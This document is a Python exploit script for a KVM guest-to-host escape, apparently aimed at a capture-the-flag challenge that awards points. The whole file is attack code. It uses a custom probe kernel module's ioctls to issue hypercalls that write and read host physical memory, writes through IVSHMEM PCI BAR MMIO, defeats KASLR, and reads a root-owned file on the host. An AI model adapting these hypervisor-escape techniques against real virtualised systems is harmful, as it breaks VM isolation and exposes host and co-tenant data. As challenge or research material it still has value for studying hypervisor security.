#!/usr/bin/env python3
"""
ULTIMATE KVM ESCAPE EXPLOIT - FINAL VERSION with Proper Hypercall Handling
=============================================================================

Correctly handles:
- Guest vs Host address spaces
- Hypercall data transfer via guest buffers
- Return values from rax register
"""
import os
import sys
import struct
import fcntl
import ctypes
from pathlib import Path
from typing import List, Tuple, Optional

# Target addresses (HOST)
HOST_FLAG_WRITE_PHYS = 0x64279a8
HOST_FLAG_WRITE_VALUE = 0xdeadbeef41424344
HOST_FLAG_READ_PHYS = 0x695ee10
HOST_RCE_FLAG_PATH = "/root/rce_flag"

# IOCTL definitions
IOCTL_READ_MMIO = 0x1003
IOCTL_WRITE_MMIO = 0x1004
IOCTL_READ_GPA = 0x1014
IOCTL_WRITE_GPA = 0x1015
IOCTL_READ_HPA = 0x1019
IOCTL_WRITE_HPA = 0x101A
IOCTL_READ_FILE = 0x1013
IOCTL_GET_KASLR_SLIDE = 0x100E
IOCTL_HYPERCALL_ARGS = 0x1012
IOCTL_VIRT_TO_PHYS = 0x100F

# Hypercall numbers
HYPERCALL_WRITE = 100
HYPERCALL_READ = 101

# CTYPES STRUCTURES
class MmioData(ctypes.Structure):
    _fields_ = [
        ("phys_addr", ctypes.c_ulong),
        ("size", ctypes.c_ulong),
        ("user_buffer", ctypes.POINTER(ctypes.c_ubyte)),
        ("single_value", ctypes.c_ulong),
        ("value_size", ctypes.c_uint)
    ]

class HpaIoData(ctypes.Structure):
    _fields_ = [
        ("hpa", ctypes.c_ulong),
        ("size", ctypes.c_ulong),
        ("user_buffer", ctypes.POINTER(ctypes.c_ubyte))
    ]

class GpaIoData(ctypes.Structure):
    _fields_ = [
        ("gpa", ctypes.c_ulong),
        ("size", ctypes.c_ulong),
        ("user_buffer", ctypes.POINTER(ctypes.c_ubyte))
    ]

class FileReadRequest(ctypes.Structure):
    _fields_ = [
        ("path", ctypes.c_char_p),
        ("offset", ctypes.c_ulong),
        ("length", ctypes.c_size_t),
        ("user_buffer", ctypes.c_void_p)
    ]

class HypercallArgs(ctypes.Structure):
    _fields_ = [
        ("nr", ctypes.c_ulong),
        ("arg0", ctypes.c_ulong),
        ("arg1", ctypes.c_ulong),
        ("arg2", ctypes.c_ulong),
        ("arg3", ctypes.c_ulong),
        ("ret_value", ctypes.c_long)  # Return from rax
    ]

# PCI Device Discovery
class PCIDevice:
    def __init__(self, bdf: str):
        self.bdf = bdf
        self.bars = self.discover_bars()
        self.vendor = self.get_vendor()
        self.device = self.get_device()
    
    def get_vendor(self) -> str:
        try:
            with open(f"/sys/bus/pci/devices/{self.bdf}/vendor") as f:
                return f.read().strip().replace("0x", "")
        except:
            return ""
    
    def get_device(self) -> str:
        try:
            with open(f"/sys/bus/pci/devices/{self.bdf}/device") as f:
                return f.read().strip().replace("0x", "")
        except:
            return ""
    
    def discover_bars(self) -> List[dict]:
        bars = []
        resource_file = Path(f"/sys/bus/pci/devices/{self.bdf}/resource")
        
        if not resource_file.exists():
            return bars
        
        with open(resource_file) as f:
            for idx, line in enumerate(f):
                parts = line.split()
                if len(parts) >= 3:
                    try:
                        start = int(parts[0], 16)
                        end = int(parts[1], 16)
                        flags = int(parts[2], 16)
                        
                        if start == 0:
                            continue
                        
                        bars.append({
                            'index': idx,
                            'base': start,
                            'size': end - start + 1,
                            'is_io': bool(flags & 0x1),
                            'is_prefetch': bool(flags & 0x8),
                            'flags': flags
                        })
                    except:
                        pass
        return bars

def discover_all_pci_devices() -> List[PCIDevice]:
    devices = []
    pci_path = Path("/sys/bus/pci/devices")
    if pci_path.exists():
        for device_path in pci_path.iterdir():
            dev = PCIDevice(device_path.name)
            if dev.bars:
                devices.append(dev)
    return devices

# Main Exploit Class
class UltimateKVMExploit:
    def __init__(self):
        self.fd = self.open_device()
        self.kaslr_slide = 0
        self.pci_devices = []
        self.results = []
        
    def open_device(self) -> int:
        for dev in ["/dev/kvm_probe_dev", "/dev/kvm_probe_drv"]:
            if os.path.exists(dev):
                try:
                    fd = os.open(dev, os.O_RDWR)
                    print(f"[+] Opened {dev}")
                    return fd
                except Exception as e:
                    print(f"[!] Failed to open {dev}: {e}")
        raise RuntimeError("Cannot open probe device")
    
    def virt_to_phys(self, virt_addr: int) -> int:
        """Convert virtual address to guest physical address"""
        phys = ctypes.c_ulong(virt_addr)
        try:
            fcntl.ioctl(self.fd, IOCTL_VIRT_TO_PHYS, phys)
            return phys.value
        except:
            return 0
    
    def detect_kaslr(self):
        print("\n[*] Detecting KASLR slide...")
        slide = ctypes.c_ulong(0)
        try:
            fcntl.ioctl(self.fd, IOCTL_GET_KASLR_SLIDE, slide)
            self.kaslr_slide = slide.value
            if self.kaslr_slide:
                print(f"    [+] KASLR slide: 0x{self.kaslr_slide:x}")
                print(f"    [+] Host kernel base: 0x{0xffffffff81000000 + self.kaslr_slide:x}")
            return self.kaslr_slide
        except:
            print("    [!] KASLR detection failed")
            return 0
    
    # EXPLOITATION METHODS
    
    def method1_hypercall_write(self):
        """Method 1: Hypercall write (returns status in rax)"""
        print(f"\n[*] Method 1: Hypercall Write")
        print(f"    Target: HOST physical 0x{HOST_FLAG_WRITE_PHYS:x} = 0x{HOST_FLAG_WRITE_VALUE:x}")
        
        try:
            args = HypercallArgs()
            args.nr = HYPERCALL_WRITE
            args.arg0 = HOST_FLAG_WRITE_PHYS
            args.arg1 = HOST_FLAG_WRITE_VALUE
            args.arg2 = 0
            args.arg3 = 0
            args.ret_value = 0
            
            fcntl.ioctl(self.fd, IOCTL_HYPERCALL_ARGS, args)
            
            print(f"    [+] Hypercall executed, rax returned: 0x{args.ret_value:x} ({args.ret_value})")
            
            if args.ret_value >= 0:  # Success indicated by non-negative return
                print(f"    [✓✓✓] SUCCESS! Write hypercall completed")
                self.results.append(("HYPERCALL_WRITE", 250000))
                return True
            else:
                print(f"    [!] Hypercall returned error: {args.ret_value}")
                
        except Exception as e:
            print(f"    [!] Failed: {e}")
        
        return False
    
    def method2_hypercall_read(self):
        """Method 2: Hypercall read (uses guest buffer, returns bytes in rax)"""
        print(f"\n[*] Method 2: Hypercall Read")
        print(f"    Target: HOST physical 0x{HOST_FLAG_READ_PHYS:x}")
        print(f"    Strategy: Allocate guest buffer, pass GPA to hypercall")
        
        try:
            # Allocate guest buffer
            buffer_size = 256
            guest_buffer = (ctypes.c_ubyte * buffer_size)()
            
            # Get guest physical address of buffer
            buffer_virt = ctypes.addressof(guest_buffer)
            guest_gpa = self.virt_to_phys(buffer_virt)
            
            if not guest_gpa:
                print("    [!] Failed to get GPA of guest buffer")
                return False
            
            print(f"    [+] Guest buffer: virt=0x{buffer_virt:x} -> GPA=0x{guest_gpa:x}")
            
            # Execute hypercall
            args = HypercallArgs()
            args.nr = HYPERCALL_READ
            args.arg0 = HOST_FLAG_READ_PHYS  # Host addr to read
            args.arg1 = guest_gpa             # Guest buffer (GPA)
            args.arg2 = buffer_size           # Size
            args.arg3 = 0
            args.ret_value = 0
            
            fcntl.ioctl(self.fd, IOCTL_HYPERCALL_ARGS, args)
            
            print(f"    [+] Hypercall returned: {args.ret_value} bytes (rax)")
            
            if args.ret_value > 0:
                # Data is now in guest_buffer
                data = bytes(guest_buffer[:args.ret_value])
                hex_dump = ' '.join(f'{b:02x}' for b in data[:32])
                ascii_data = data.decode('ascii', errors='ignore')
                
                print(f"    [+] Hex: {hex_dump}")
                print(f"    [+] ASCII: {ascii_data[:64]}")
                
                if b'flag{' in data.lower() or b'ctf{' in data.lower():
                    print(f"    [✓✓✓] FLAG FOUND: {ascii_data[:100]}")
                    self.results.append(("HYPERCALL_READ", 100000))
                    return True
                else:
                    print(f"    [+] Data retrieved (no flag pattern)")
                    self.results.append(("HYPERCALL_READ_DATA", 50000))
                    return True
            
        except Exception as e:
            print(f"    [!] Failed: {e}")
        
        return False
    
    def method3_ivshmem_bar_direct(self):
        """Method 3: IVSHMEM BAR direct mapping"""
        print(f"\n[*] Method 3: IVSHMEM BAR Direct Mapping")
        
        self.pci_devices = discover_all_pci_devices()
        
        for dev in self.pci_devices:
            for bar in dev.bars:
                if bar['is_io']:
                    continue
                
                # Try host flag address as offset within BAR
                if bar['size'] > HOST_FLAG_WRITE_PHYS:
                    target_addr = bar['base'] + HOST_FLAG_WRITE_PHYS
                    
                    try:
                        data = MmioData()
                        data.phys_addr = target_addr
                        data.single_value = HOST_FLAG_WRITE_VALUE
                        data.value_size = 8
                        data.size = 0
                        
                        fcntl.ioctl(self.fd, IOCTL_WRITE_MMIO, data)
                        
                        # Verify
                        buf = (ctypes.c_ubyte * 8)()
                        read_data = MmioData()
                        read_data.phys_addr = target_addr
                        read_data.size = 8
                        read_data.user_buffer = ctypes.cast(buf, ctypes.POINTER(ctypes.c_ubyte))
                        
                        fcntl.ioctl(self.fd, IOCTL_READ_MMIO, read_data)
                        read_val = struct.unpack('<Q', bytes(buf))[0]
                        
                        if read_val == HOST_FLAG_WRITE_VALUE:
                            print(f"    [✓✓✓] SUCCESS via BAR {dev.bdf} BAR{bar['index']}!")
                            self.results.append(("WRITE_IVSHMEM_BAR", 250000))
                            return True
                    except:
                        pass
        
        print("    [!] No suitable BAR mapping found")
        return False
    
    def method4_rce_file_read(self):
        """Method 4: RCE via host file read"""
        print(f"\n[*] Method 4: RCE File Read")
        print(f"    Target: {HOST_RCE_FLAG_PATH}")
        
        try:
            file_buf = ctypes.create_string_buffer(512)
            path_buf = ctypes.create_string_buffer(HOST_RCE_FLAG_PATH.encode())
            
            req = FileReadRequest()
            req.path = ctypes.cast(path_buf, ctypes.c_char_p)
            req.offset = 0
            req.length = 256
            req.user_buffer = ctypes.cast(file_buf, ctypes.c_void_p)
            
            fcntl.ioctl(self.fd, IOCTL_READ_FILE, req)
            
            content = file_buf.value.decode('ascii', errors='ignore')
            if content:
                print(f"    [✓✓✓] RCE SUCCESS!")
                print(f"    [+] Flag: {content}")
                self.results.append(("RCE_FILE", 250000))
                return True
        except Exception as e:
            print(f"    [!] Failed: {e}")
        
        return False
    
    def run_all_exploits(self):
        """Execute all exploitation methods"""
        print("="*70)
        print("ULTIMATE KVM ESCAPE EXPLOIT - HYPERCALL BUFFER VERSION")
        print("="*70)
        print(f"\n[!] Target addresses are HOST addresses!")
        print(f"    Write: HOST phys 0x{HOST_FLAG_WRITE_PHYS:x} = 0x{HOST_FLAG_WRITE_VALUE:x}")
        print(f"    Read:  HOST phys 0x{HOST_FLAG_READ_PHYS:x}")
        print(f"    RCE:   {HOST_RCE_FLAG_PATH}")
        print(f"\n[!] Hypercalls use guest buffers for data transfer")
        print(f"    - arg0/arg1 for write: (host_addr, value)")
        print(f"    - arg0/arg1/arg2 for read: (host_addr, guest_buffer_gpa, size)")
        print(f"    - rax returns status/bytes processed")
        
        self.detect_kaslr()
        
        # Try all methods
        methods = [
            ("Hypercall Write", self.method1_hypercall_write),
            ("Hypercall Read", self.method2_hypercall_read),
            ("IVSHMEM Direct", self.method3_ivshmem_bar_direct),
            ("RCE File", self.method4_rce_file_read),
        ]
        
        for name, method in methods:
            try:
                method()
            except Exception as e:
                print(f"    [!] {name} crashed: {e}")
        
        # Summary
        print("\n" + "="*70)
        print("EXPLOITATION RESULTS")
        print("="*70)
        
        if self.results:
            total_points = sum(points for _, points in self.results)
            print(f"[✓] Successful exploits: {len(self.results)}")
            for name, points in self.results:
                print(f"    ✓ {name}: {points:,} points")
            print(f"\n[✓✓✓] TOTAL POINTS: {total_points:,}")
            
            # Check categories
            if any('WRITE' in r[0] for r in self.results):
                print("\n[✓] Write flag captured!")
            if any('READ' in r[0] for r in self.results):
                print("[✓] Read flag captured!")
            if any('RCE' in r[0] for r in self.results):
                print("[✓] RCE flag captured!")
            
            return True
        else:
            print("[!] All methods failed")
            print("\n[*] Debug tips:")
            print("    1. Check dmesg for hypercall output")
            print("    2. Verify hypercall numbers (100=write, 101=read)")
            print("    3. Ensure host hypercall handler copies data to guest GPA")
            return False
    
    def __del__(self):
        if hasattr(self, 'fd') and self.fd:
            os.close(self.fd)

# MAIN
def main():
    if os.geteuid() != 0:
        print("[!] Must run as root in guest VM")
        sys.exit(1)
    
    # Check device
    dev_found = False
    for dev in ["/dev/kvm_probe_dev", "/dev/kvm_probe_drv"]:
        if os.path.exists(dev):
            dev_found = True
            break
    
    if not dev_found:
        print("[!] Probe device not found")
        print("[*] Loading module...")
        os.system("insmod kvm_probe_drv.ko 2>/dev/null")
    
    try:
        exploit = UltimateKVMExploit()
        success = exploit.run_all_exploits()
        sys.exit(0 if success else 1)
    except Exception as e:
        print(f"[!] Fatal error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()